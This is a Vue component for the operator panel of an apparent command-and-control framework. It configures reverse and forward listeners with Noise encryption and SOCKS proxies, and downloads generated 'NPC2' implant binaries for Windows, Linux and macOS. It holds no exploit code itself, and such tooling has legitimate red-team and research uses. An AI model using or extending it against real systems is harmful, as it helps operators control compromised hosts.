<script setup>
import { ref, reactive, computed, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Refresh, Delete, Edit, VideoPlay, VideoPause, Search, Download } from '@element-plus/icons-vue'
import { listenList, listenDelete, listenUpdate, listenAction, npc2Download } from '@/api/listen'
import { proxyList } from '@/api/proxy'
import { formatTime } from '@/utils/format'
import { licenseAllowed } from '@/utils/license'

const loading = ref(false)
const list = ref([])
const keyword = ref('')

const filteredList = computed(() => {
  const kw = keyword.value.trim().toLowerCase()
  if (!kw) return list.value
  return list.value.filter(
    (l) =>
      String(l.transport || '').toLowerCase().includes(kw) ||
      String(l.listenaddr || '').toLowerCase().includes(kw) ||
      String(l.onlineaddr || '').toLowerCase().includes(kw) ||
      String(l.enckey || '').toLowerCase().includes(kw) ||
      String(l.noise || '').toLowerCase().includes(kw),
  )
})

const transports = [
  { label: '反向TCP', value: 'tcp' },
  { label: '反向UDP', value: 'kcp' },
  { label: '反向WS', value: 'ws' },
  { label: '正向TCP', value: 'ftcp' },
  { label: '正向UDP', value: 'fkcp' },
  { label: '原生SSH', value: 'ssh' },
]

const rttOptions = ['KK', 'NN', 'XX', 'NK', 'NX', 'IK']
const dhOptions = ['25519', '448']
const encOptions = ['ChaChaPoly', 'AESGCM']
const hashOptions = ['BLAKE2s', 'BLAKE2b', 'SHA256', 'SHA512']

function parseNoise(noise) {
  const d = { RTT: 'KK', DH: '25519', ENC: 'ChaChaPoly', HASH: 'BLAKE2s' }
  if (!noise || !String(noise).startsWith('Noise_')) return d
  const parts = String(noise).split('_')
  if (parts.length < 5) return d
  return {
    RTT: parts[1] || d.RTT,
    DH: parts[2] || d.DH,
    ENC: parts[3] || d.ENC,
    HASH: parts.slice(4).join('_') || d.HASH,
  }
}
function buildNoise(p) {
  return `Noise_${p.RTT}_${p.DH}_${p.ENC}_${p.HASH}`
}

async function loadData() {
  loading.value = true
  try {
    const res = await listenList({})
    const data = (res && res.result) || {}
    list.value = data.items || []
  } catch {

  } finally {
    loading.value = false
  }
}

const dialogVisible = ref(false)
const submitting = ref(false)
const isEdit = ref(false)
const form = reactive({
  id: null,
  listenaddr: '0.0.0.0:32000',
  onlineaddr: '',
  proxyaddr: '',
  transport: 'tcp',
  enckey: 'manjusaka',
  config: '',
  isrun: false,
  loginUser: 'root',

  RTT: 'KK',
  DH: '25519',
  ENC: 'ChaChaPoly',
  HASH: 'BLAKE2s',
})

const isSSH = computed(() => form.transport === 'ssh')

// 隧道代理下拉选项：从 Socks5 隧道拼接代理串，也允许手动输入自定义代理
const proxyOptions = ref([])

function proxyOptionLabel(p) {
  const agent = p.agent ? String(p.agent).slice(0, 8) : '-'
  let auth = ''
  if (p.username && p.password) {
    auth = `${p.username}:${p.password}@`
  }
  return `socks://${auth}127.0.0.1:${p.local_port}`
}

async function loadProxyOptions() {
  try {
    const res = await proxyList()
    const items = (res && res.result) || []
    // Mapping 是端口转发不是代理，拼接出来也无法作为 proxyaddr 使用，只保留 Socks5
    proxyOptions.value = items.filter((p) => String(p.name || '').toLowerCase() === 'socks5')
  } catch {
    proxyOptions.value = []
  }
}

function openAdd() {
  isEdit.value = false
  loadProxyOptions()
  Object.assign(form, {
    id: null,
    listenaddr: '0.0.0.0:32000',
    onlineaddr: '',
    proxyaddr: '',
    transport: 'tcp',
    enckey: 'manjusaka',
    config: '',
    isrun: false,
    loginUser: 'root',
    RTT: 'KK',
    DH: '25519',
    ENC: 'ChaChaPoly',
    HASH: 'BLAKE2s',
  })
  dialogVisible.value = true
}
function openEdit(row) {
  isEdit.value = true
  loadProxyOptions()
  const np = parseNoise(row.noise)
  Object.assign(form, { ...row, ...np })
  // SSH 模式下 noise 字段存的是用户名
  if (row.transport === 'ssh') {
    form.loginUser = row.noise || ''
  }
  dialogVisible.value = true
}

async function submit() {
  if (!form.listenaddr) {
    ElMessage.warning('请填写监听地址')
    return
  }
  submitting.value = true
  try {
    const { RTT, DH, ENC, HASH, loginUser, ...rest } = form
    const payload = { ...rest }
    payload.noise = isSSH.value ? loginUser : buildNoise({ RTT, DH, ENC, HASH })
    if (!payload.id) delete payload.id
    await listenUpdate(payload)
    ElMessage.success('已保存')
    dialogVisible.value = false
    loadData()
  } catch {

  } finally {
    submitting.value = false
  }
}

async function handleDelete(row) {
  try {
    await ElMessageBox.confirm(
      `确定删除连接器 ${row.listenaddr} 吗？该操作不可恢复。`,
      '删除确认',
      { type: 'warning', confirmButtonText: '删除', cancelButtonText: '取消' },
    )
    await listenDelete(row.id)
    ElMessage.success('已删除')
    loadData()
  } catch {

  }
}

async function toggleRun(row) {
  try {
    await listenAction(row.id, !row.isrun)
    ElMessage.success(row.isrun ? '已停止' : '已启动')
    loadData()
  } catch {

  }
}

// ============================================================================
// 生成NPC2 (独立 exe/elf, 只能选择正向/反向连接器, 原生SSH不支持;
// 通过管理接口直接下载到本地, 不经项目路由)
// ============================================================================
const npc2Visible = ref(false)
const npc2Loading = ref(false)
const npc2Form = reactive({ listen: '', platform: '1', arch: '1' })

const archOptions = [
  { label: 'x86_64', value: '1' },
  { label: 'x86', value: '2' },
  { label: 'aarch64', value: '3' },
  { label: 'mips64', value: '5' },
  { label: 'loongarch64', value: '7' },
]
const platformOptions = [
  { label: 'Windows', value: '1' },
  { label: 'Linux', value: '2' },
  { label: 'macOS', value: '3' },
]

// strmod 编码映射 (与后端一致)
const archMap = { '1': 'x86_64', '2': 'x86', '3': 'aarch64', '5': 'mips64', '7': 'loongarch64' }
const platformMap = { '1': 'windows', '2': 'linux', '3': 'macos' }

// 仅正反向连接可用 (排除原生SSH)
const npc2ListenOptions = computed(() =>
  list.value
    .filter((l) => l.transport !== 'ssh')
    .map((l) => ({
      label: `${l.transport}@${l.onlineaddr || l.listenaddr}`,
      value: l.id,
    })),
)

function openNpc2() {
  if (!licenseAllowed()) return
  if (!list.value.length) {
    ElMessage.warning('请先创建连接器')
    return
  }
  Object.assign(npc2Form, { listen: '', platform: '1', arch: '1' })
  npc2Visible.value = true
}

async function doDownloadNpc2() {
  if (!licenseAllowed()) return
  const lis = list.value.find((l) => l.id === npc2Form.listen)
  if (!lis) {
    ElMessage.warning('请选择连接器')
    return
  }
  const os = platformMap[npc2Form.platform] || 'windows'
  const arch = archMap[npc2Form.arch] || 'x86_64'
  npc2Loading.value = true
  try {
    const res = await npc2Download({ listen: lis.id, os, arch })
    const blob = res && res.data
    if (!blob || !blob.size) {
      ElMessage.error('下载失败: 响应为空')
      return
    }
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    // win=exe / linux=elf / mac=osx
    const ext = os === 'windows' ? 'exe' : os === 'macos' ? 'osx' : 'elf'
    a.download = `npc2.${os}.${arch}.${ext}`
    a.click()
    URL.revokeObjectURL(url)
    ElMessage.success('NPC2 已下载到本地')
  } catch {

  } finally {
    npc2Loading.value = false
  }
}

onMounted(loadData)
</script>

<template>
  <div class="page-container">
    <el-card shadow="never">
      <div class="toolbar">
        <el-input
          v-model="keyword"
          placeholder="搜索 协议 / 地址 / 密钥"
          :prefix-icon="Search"
          clearable
          size="small"
          style="width: 280px"
        />
        <div class="flex-grow"></div>
        <el-button type="primary" size="small" :icon="Download" @click="openNpc2">生成NPC2</el-button>
        <el-button type="primary" size="small" :icon="Plus" @click="openAdd">新建连接器</el-button>
        <el-button size="small" :icon="Refresh" :loading="loading" @click="loadData">刷新</el-button>
      </div>

      <el-table v-loading="loading" :data="filteredList" border stripe size="small" empty-text="暂无连接器">
        <el-table-column label="协议" prop="transport" width="90" align="center" />
        <el-table-column label="监听地址" prop="listenaddr" min-width="160" show-overflow-tooltip />
        <el-table-column label="上线地址" prop="onlineaddr" min-width="160" show-overflow-tooltip />
        <el-table-column label="密钥" prop="enckey" min-width="120" show-overflow-tooltip />
        <el-table-column label="加密方式" prop="noise" min-width="240" show-overflow-tooltip />
        <el-table-column label="状态" width="110" align="center">
          <template #default="{ row }">
            <span
              class="status-dot"
              :class="{ alive: row.isrun, dead: !row.isrun }"
            ></span>
            <span :style="{ color: row.isrun ? 'var(--tk-accent)' : '#ffaa00' }">
              {{ row.isrun ? '运行中' : '已停止' }}
            </span>
          </template>
        </el-table-column>
        <el-table-column label="更新时间" width="170">
          <template #default="{ row }">{{ formatTime(row.updateat) }}</template>
        </el-table-column>
        <el-table-column label="操作" width="230" fixed="right" class-name="op-col">
          <template #default="{ row }">
            <el-button
              size="small"
              :type="row.isrun ? 'warning' : 'success'"
              :icon="row.isrun ? VideoPause : VideoPlay"
              @click="toggleRun(row)"
            >{{ row.isrun ? '停止' : '启动' }}</el-button>
            <el-button size="small" :icon="Edit" @click="openEdit(row)">编辑</el-button>
            <el-button size="small" type="danger" :icon="Delete" @click="handleDelete(row)">
              删除
            </el-button>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <el-dialog v-model="dialogVisible" :title="isEdit ? '编辑连接器' : '新建连接器'" width="620px">
      <el-form :model="form" label-width="100px">
        <el-form-item label="协议" required>
          <el-radio-group v-model="form.transport">
            <el-radio-button v-for="t in transports" :key="t.value" :value="t.value">
              {{ t.label }}
            </el-radio-button>
          </el-radio-group>
        </el-form-item>
        <el-form-item :label="isSSH ? '主机备注' : '监听地址'" required>
          <el-input v-model="form.listenaddr" :placeholder="isSSH ? '备注' : '0.0.0.0:32000'" />
        </el-form-item>
        <el-form-item label="上线地址" required>
          <el-input v-model="form.onlineaddr" placeholder="可访问的外网地址" />
        </el-form-item>
        <el-form-item v-if="isSSH" label="登录用户" required>
          <el-input v-model="form.loginUser" placeholder="root" />
        </el-form-item>
        <template v-if="!isSSH">
          <el-form-item label="握手模式" required>
            <el-radio-group v-model="form.RTT">
              <el-radio-button v-for="o in rttOptions" :key="o" :value="o">{{ o }}</el-radio-button>
            </el-radio-group>
          </el-form-item>
          <el-form-item label="密钥交换" required>
            <el-radio-group v-model="form.DH">
              <el-radio-button v-for="o in dhOptions" :key="o" :value="o">{{ o }}</el-radio-button>
            </el-radio-group>
          </el-form-item>
          <el-form-item label="加密算法" required>
            <el-radio-group v-model="form.ENC">
              <el-radio-button v-for="o in encOptions" :key="o" :value="o">{{ o }}</el-radio-button>
            </el-radio-group>
          </el-form-item>
          <el-form-item label="哈希算法" required>
            <el-radio-group v-model="form.HASH">
              <el-radio-button v-for="o in hashOptions" :key="o" :value="o">{{ o }}</el-radio-button>
            </el-radio-group>
          </el-form-item>
        </template>
        <el-form-item :label="isSSH ? '登录密码' : '加密密钥'">
          <el-input v-model="form.enckey" :placeholder="isSSH ? 'SSH登录密码' : ''" />
        </el-form-item>
        <el-form-item label="代理地址">
          <el-select
            v-model="form.proxyaddr"
            filterable
            allow-create
            default-first-option
            clearable
            placeholder="如 socks://user:pass@127.0.0.1:8080"
            style="width: 100%"
          >
            <el-option
              v-for="(p, idx) in proxyOptions"
              :key="idx"
              :label="proxyOptionLabel(p)"
              :value="proxyOptionLabel(p)"
            />
          </el-select>
        </el-form-item>
        <el-form-item :label="isSSH ? '连接私钥' : '其它配置'">
          <el-input v-model="form.config" type="textarea" :autosize="{ minRows: 2 }" :placeholder="isSSH ? 'SSH私钥内容（可选）' : ''" />
        </el-form-item>
        <el-form-item label="自动启动">
          <el-switch v-model="form.isrun" />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="submitting" @click="submit">保存</el-button>
      </template>
    </el-dialog>

    <el-dialog v-model="npc2Visible" title="生成NPC2" width="640px">
      <el-form :model="npc2Form" label-width="100px">
        <el-form-item label="选择连接器">
          <el-select v-model="npc2Form.listen" filterable placeholder="仅支持正向/反向连接" style="width: 100%">
            <el-option v-for="o in npc2ListenOptions" :key="o.value" :label="o.label" :value="o.value" />
          </el-select>
        </el-form-item>
        <el-form-item label="CPU架构">
          <el-radio-group v-model="npc2Form.arch">
            <el-radio-button v-for="o in archOptions" :key="o.value" :value="o.value">
              {{ o.label }}
            </el-radio-button>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="目标系统">
          <el-radio-group v-model="npc2Form.platform">
            <el-radio-button v-for="o in platformOptions" :key="o.value" :value="o.value">
              {{ o.label }}
            </el-radio-button>
          </el-radio-group>
        </el-form-item>
      </el-form>

      <template #footer>
        <div class="payload-footer">
          <el-button type="primary" :loading="npc2Loading" :icon="Download" @click="doDownloadNpc2">下载</el-button>
          <el-button @click="npc2Visible = false">关闭</el-button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<style scoped>
.payload-footer {
  display: flex;
  justify-content: space-between;
  width: 100%;
}
.form-tip {
  font-size: 12px;
  color: var(--tk-accent-dim);
  line-height: 1.6;
  margin-top: 2px;
}
.status-dot {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  margin-right: 4px;
}
.status-dot.alive {
  background: var(--tk-accent);
  box-shadow: 0 0 6px var(--tk-accent);
  animation: pulse-green 2s infinite;
}
.status-dot.dead {
  background: #ffaa00;
}
@keyframes pulse-green {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.4; }
}
</style>
